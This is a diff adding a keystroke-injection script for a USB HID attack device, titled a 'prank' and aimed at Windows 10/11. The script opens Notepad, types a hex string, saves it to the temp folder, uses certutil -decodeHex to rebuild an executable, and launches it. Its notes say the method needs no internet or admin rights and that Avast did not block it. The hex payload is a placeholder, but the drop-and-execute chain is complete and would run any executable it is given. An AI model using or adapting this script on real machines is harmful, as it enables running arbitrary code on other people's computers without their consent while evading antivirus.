@@ -1,0 +1,59 @@
+* REM ##################################
+* REM #                                #
+* REM # Title        : Pranh(ex)       #
+* REM # Author       : Aleff           #
+* REM # Version      : 1.0             #
+* REM # Category     : Prank           #
+* REM # Target       : Windows 10/11   #
+* REM #                                #
+* REM ##################################
+
+ATTACKMODE HID
+
+Plug-And-Play <3
+
+QUACK REM REQUIREMENTS
+* REM Nothing (i know, it's absurd)
+
+QUACK REM NOTE
+* REM - For the creation of the executable, the hexadecimal code and in general to create this program I stuck to the payload: `Install And Run Any Arbitrary Executable - No Internet And Root Needed`
+* REM - Tested on Windows 11
+* REM - Running checked but not blocked by Avast antivirus
+* REM - Original Python code in assets/pranh(ex).py
+* REM - Hex content in assets/hexfile.txt
+* REM - exe file in assets/pranh(ex).exe
+
+QUACK REM VARIABLES
+* REM Hex string here
+HEX='example'
+
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING notepad.exe
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING $HEX
+QUACK DELAY 2000
+QUACK ALT F
+QUACK DELAY 1000
+QUACK STRING S
+QUACK DELAY 1000
+QUACK STRING \"%TEMP%\pranhex.hex\"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ALT F4
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING certutil -f -decodeHex \"%TEMP%\pranhex.hex\" \"%TEMP%\pranhex.exe\"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 250
+QUACK STRING \"%TEMP%\pranhex.exe\"
+QUACK ENTER
+QUACK ENTER
